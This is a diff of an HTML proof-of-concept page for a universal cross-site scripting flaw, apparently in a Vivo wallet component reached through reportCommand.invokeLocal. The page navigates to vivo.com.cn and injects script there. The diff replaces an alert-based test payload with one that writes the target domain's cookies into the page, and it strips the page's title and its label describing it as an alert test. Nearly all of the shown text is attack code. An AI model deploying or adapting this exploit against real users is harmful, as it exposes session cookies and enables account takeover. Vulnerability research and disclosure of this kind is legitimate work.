@@ -1,14 +1,17 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Vivo Wallet UXSS - reportCommand Alert</title></head>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
 <body>
-<pre>UXSS via reportCommand.invokeLocal - alert test</pre>
 <script>
+
 (function() {
     var TARGET = "https://www.vivo.com.cn/";
     var NAV_DELAY_MS = 200;
 
-    var payload = "alert('UXSS:'+document.domain+' cookie='+document.cookie);//";
+    var payload = "document.write('UXSS:'+document.domain+' cookie='+document.cookie);//";
 
     function inject() {
         try {
@@ -26,5 +29,3 @@
     }, NAV_DELAY_MS);
 })();
 </script>
-</body>
-</html>
